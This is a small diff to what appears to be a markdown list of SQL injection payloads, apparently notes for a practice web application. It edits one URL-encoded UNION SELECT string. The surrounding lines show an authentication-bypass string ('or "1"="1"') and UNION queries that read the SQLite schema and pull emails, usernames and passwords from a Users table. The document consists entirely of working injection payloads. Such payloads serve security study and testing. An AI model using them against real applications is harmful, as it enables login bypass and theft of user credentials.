@@ -93,7 +93,7 @@ admin") or "1"="1"/*
 
 '))%20union%20all%20select%201,2,3,4,5,6,7,8,9%20--%20
 
-a'))%20union%20all%20select%201,2,3,sql,5,6,7,8,9%20from%20sqlite_master%20--%20
+'))%20union%20all%20select%201,2,3,sql,5,6,7,8,9%20from%20sqlite_master%20--%20
 
 '))%20union%20all%20select%201,email,username,4,password,6,7,8,9%20from%20Users%20--%20
 ```
